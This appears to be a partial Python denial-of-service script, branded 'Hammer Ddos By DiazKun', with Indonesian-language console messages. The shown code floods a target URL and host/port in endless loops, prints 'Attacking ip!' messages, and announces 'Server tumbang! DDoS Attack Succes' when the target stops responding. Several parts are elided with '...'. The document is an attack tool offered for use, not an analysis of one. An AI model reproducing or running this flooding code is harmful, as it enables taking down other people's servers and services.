...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mDiazKun Tools mengelus target...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Attacking ip!--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mBerhenti<->ah\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mServer tumbang! DDoS Attack Succes\033[0m")
...
def usage():
	...
	Hammer Ddos By DiazKun(Ngabisin kuota anjg)
...
if __name__ == '__main__':
	...
	print("\033[94mProses Tod sabar ya su...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
